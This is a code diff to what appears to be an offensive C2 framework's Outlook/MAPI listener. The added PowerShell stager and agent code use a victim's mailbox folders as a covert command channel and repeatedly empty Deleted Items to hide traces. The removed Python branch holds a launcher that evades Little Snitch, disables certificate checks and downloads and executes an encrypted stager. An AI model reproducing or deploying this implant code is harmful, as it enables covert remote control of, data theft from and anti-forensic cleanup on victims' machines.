@@ -188,9 +188,11 @@ class Listener:
 
                 # clear out all existing mails/messages
 
-                stager += helpers.randomize_capitalization("foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('")
+                stager += helpers.randomize_capitalization("while(($outlook.Session.GetDefaultFolder(6).Folders.Item('")
                 stager += listenerOptions['Folder']['Value']
-                stager += helpers.randomize_capitalization("').items) { $item.Delete(); }")
+                stager += helpers.randomize_capitalization("').Items | measure | %{$_.Count}) -gt 0 ){ $outlook.Session.GetDefaultFolder(6).Folders.Item('")
+                stager += listenerOptions['Folder']['Value']
+                stager += helpers.randomize_capitalization("').Items | %{$_.delete()};}")
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -214,11 +216,12 @@ class Listener:
                 stager += helpers.randomize_capitalization('\'))| out-null;')
                 stager += helpers.randomize_capitalization('$break = $False; $data = "";')
                 stager += helpers.randomize_capitalization("While ($break -ne $True){")
-                stager += helpers.randomize_capitalization("foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('")
-                stager += "%s').Items) {" % listenerOptions['Folder']['Value']
-                stager += helpers.randomize_capitalization("if($item.Subject -eq ")
-                stager += "\"mailpirein\""
-                stager += helpers.randomize_capitalization("){$item.HTMLBody | out-null;if($item.Body[$item.Body.Length-1] -ne '-'){$traw = $item.Body;$item.Delete();$break = $True;$data = [System.Convert]::FromBase64String($traw);;}}}Start-Sleep -s 2;}")
+                stager += helpers.randomize_capitalization('$outlook.Session.GetDefaultFolder(6).Folders.Item("')
+                stager += listenerOptions['Folder']['Value']
+                stager += helpers.randomize_capitalization('").Items | Where-Object {$_.Subject -eq "mailpirein"} | %{$_.HTMLBody | out-null} ;')
+                stager += helpers.randomize_capitalization('$outlook.Session.GetDefaultFolder(6).Folders.Item("')
+                stager += listenerOptions['Folder']['Value']
+                stager += helpers.randomize_capitalization('").Items | Where-Object {$_.Subject -eq "mailpirein" -and $_.DownloadState -eq 1} | %{$break=$True; $data=[System.Convert]::FromBase64String($_.Body);$_.Delete();};}')
 
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
@@ -231,85 +234,21 @@ class Listener:
                 else:
                     # otherwise return the case-randomized stager
                     return stager
-
-            if language.startswith('py'):
-                # Python
-
-                launcherBase = 'import sys;'
-                if "https" in host:
-                    # monkey patch ssl woohooo
-                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
-
-                try:
-                    if safeChecks.lower() == 'true':
-                        launcherBase += "import re, subprocess;"
-                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
-                        launcherBase += "out = ps.stdout.read()\n"
-                        launcherBase += "ps.stdout.close()\n"
-                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
-                        launcherBase += "   sys.exit()\n"
-                except Exception as e:
-                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
-                    print helpers.color(p, color='red')
-
-                if userAgent.lower() == 'default':
-                    profile = listenerOptions['DefaultProfile']['Value']
-                    userAgent = profile.split('|')[1]
-
-
-                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
-                launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += "server='%s';t='%s';" % (host, stage0)
-
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
-
-                # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];" % (b64RoutingPacket)
-
-                # download the stager and extract the IV
-                launcherBase += "a=o.open(server+t).read();"
-                launcherBase += "IV=a[0:4];"
-                launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s';" % (stagingKey)
-
-                # RC4 decryption
-                launcherBase += "S,j,out=range(256),0,[]\n"
-                launcherBase += "for i in range(256):\n"
-                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "i=j=0\n"
-                launcherBase += "for char in data:\n"
-                launcherBase += "    i=(i+1)%256\n"
-                launcherBase += "    j=(j+S[i])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
-                launcherBase += "exec(''.join(out))"
-
-                if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
-                    return launcher
-                else:
-                    return launcherBase
-
             else:
-                print helpers.color("[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module.")
+                print helpers.color("[!] listeners/http_mapi generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module.")
 
         else:
-            print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")
+            print helpers.color("[!] listeners/http_mapi generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language="powershell"):
         """
         Generate the stager code needed for communications with this listener.
         """
 
-        if not language:
-            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
-            return None
+        #if not language:
+        #    print helpers.color('[!] listeners/http_mapi generate_stager(): no language specified!')
+        #    return None
 
         profile = listenerOptions['DefaultProfile']['Value']
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
@@ -318,9 +257,6 @@ class Listener:
         folder = listenerOptions['Folder']['Value']
         #email = listenerOptions['Email']['Value']
 
-        # select some random URIs for staging from the main profile
-        stage1 = random.choice(uris)
-        stage2 = random.choice(uris)
 
         if language.lower() == 'powershell':
 
@@ -334,12 +270,8 @@ class Listener:
                 host += "/"
 
             # patch the server and key information
-            stager = stager.replace('REPLACE_SERVER', host)
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
-            stager = stager.replace('index.jsp', stage1)
-            stager = stager.replace('index.php', stage2)
             stager = stager.replace('REPLACE_FOLDER', folder)
-            #stager = stager.replace('REPLACE_EMAIL', email)
 
             randomizedStager = ''
 
@@ -362,37 +294,8 @@ class Listener:
             else:
                 # otherwise just return the case-randomized stager
                 return randomizedStager
-
-        elif language.lower() == 'python':
-            # read in the stager base
-            f = open("%s/data/agent/stagers/http.py" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
-
-            stager = helpers.strip_python_comments(stager)
-
-            if host.endswith("/"):
-                host = host[0:-1]
-
-            # # patch the server and key information
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("REPLACE_PROFILE", profile)
-            stager = stager.replace("index.jsp", stage1)
-            stager = stager.replace("index.php", stage2)
-
-            # # base64 encode the stager and return it
-            if encode:
-                return base64.b64encode(stager)
-            if encrypt:
-                # return an encrypted version of the stager ("normal" staging)
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
-            else:
-                # otherwise return the standard stager
-                return stager
-
         else:
-            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' is currently supported for this module.")
 
 
     def generate_agent(self, listenerOptions, language=None):
@@ -401,7 +304,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
+            print helpers.color('[!] listeners/http_mapi generate_agent(): no language specified!')
             return None
 
         language = language.lower()
@@ -442,35 +345,8 @@ class Listener:
                 code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
 
             return code
-
-        elif language == 'python':
-            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
-            code = f.read()
-            f.close()
-
-            # patch in the comms methods
-            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
-
-            # strip out comments and blank lines
-            code = helpers.strip_python_comments(code)
-
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('delay = 60', 'delay = %s' % (delay))
-            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
-            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
-            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
-            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
-
-            # patch in the killDate and workingHours if they're specified
-            if killDate != "":
-                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
-            if workingHours != "":
-                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
-
-            return code
         else:
-            print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+            print helpers.color("[!] listeners/http_mapi generate_agent(): invalid language specification, only 'powershell' is currently supported for this module.")
 
 
     def generate_comms(self, listenerOptions, language=None):
@@ -488,12 +364,8 @@ class Listener:
                     $Script:ServerIndex = 0;
                 """ % (listenerOptions['Host']['Value'])
 
-                if listenerOptions['Host']['Value'].startswith('https'):
-                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-
                 getTask = """
                     function script:Get-Task {
-
                         try {
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
@@ -527,10 +399,12 @@ class Listener:
                                   Start-Sleep -s 1;
                                 }
                                 return ,$b
+
                         }
                         catch {
-                            $script:MissedCheckins += 1
+
                         }
+                        while(($outlook.Session.GetDefaultFolder(3).Items | measure | %{$_.Count}) -gt 0 ){ $outlook.Session.GetDefaultFolder(3).Items | %{$_.delete()};} 
                     }
                 """
 
@@ -541,17 +415,15 @@ class Listener:
                         if($Packets) {
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets;
-
                             # build the top level RC4 "routing packet"
                             # meta 'RESULT_POST' : 5
                             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
 
                             # $RoutingPacketp = [System.BitConverter]::ToString($RoutingPacket);
-                            $RoutingPacketp = [Convert]::ToBase64String($RoutingPacket);
+                            $RoutingPacketp = [Convert]::ToBase64String($RoutingPacket)
                             try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random;
-
                                     $mail = $outlook.CreateItem(0);
                                     $mail.Subject = "mailpireout";
                                     $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp;
@@ -559,70 +431,17 @@ class Listener:
                                     $mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER')) | out-null;
                                 }
                                 catch {
-
                                 }
+                                while(($outlook.Session.GetDefaultFolder(3).Items | measure | %{$_.Count}) -gt 0 ){ $outlook.Session.GetDefaultFolder(3).Items | %{$_.delete()};} 
                         }
                     }
                 """
                 return updateServers + getTask + sendMessage
 
-            elif language.lower() == 'python':
-
-                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
-
-                if listenerOptions['Host']['Value'].startswith('https'):
-                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
-
-                sendMessage = """
-def send_message(packets=None):
-    # Requests a tasking or posts data to a randomized tasking URI.
-    # If packets == None, the agent GETs a tasking from the control server.
-    # If packets != None, the agent encrypts the passed packets and
-    #    POSTs the data to the control server.
-
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
-
-    data = None
-    if packets:
-        data = ''.join(packets)
-        # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, data)
-        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-    else:
-        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
-        #   meta TASKING_REQUEST = 4
-        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = "session=%s" % (b64routingPacket)
-
-    taskURI = random.sample(taskURIs, 1)[0]
-    requestUri = server + taskURI
-
-    try:
-        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
-        return ('200', data)
-
-    except urllib2.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
-        missedCheckins = missedCheckins + 1
-        return (HTTPError.code, '')
-
-    except urllib2.URLError as URLerror:
-        # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
-        return (URLerror.reason, '')
-
-    return ('', '')
-"""
-                return updateServers + sendMessage
-
             else:
-                print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+                print helpers.color("[!] listeners/http_mapi generate_comms(): invalid language specification, only 'powershell' is currently supported for this module.")
         else:
-            print helpers.color('[!] listeners/http generate_comms(): no language specified!')
+            print helpers.color('[!] listeners/http_mapi generate_comms(): no language specified!')
 
 
     def start_server(self, listenerOptions):
